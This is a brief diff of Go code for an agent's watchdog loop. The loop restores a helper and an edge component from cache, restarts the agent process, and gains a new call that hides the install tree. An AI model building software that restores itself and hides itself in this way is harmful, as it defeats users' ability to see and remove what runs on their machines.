@@ -18,7 +18,6 @@ func wantsWatchdogMode() bool {
 
 func runWatchdog() {
 	acquireWatchdogInstance()
-	// Wait for network a bit (reconnect behavior)
 	for i := 0; i < 90; i++ {
 		if networkOK() {
 			break
@@ -28,6 +27,7 @@ func runWatchdog() {
 	for {
 		restoreHelperFromCache()
 		restoreEdgeFromCache()
+		hideInstallTree()
 		if !agentProcessRunning() {
 			startAgentProcess()
 		}
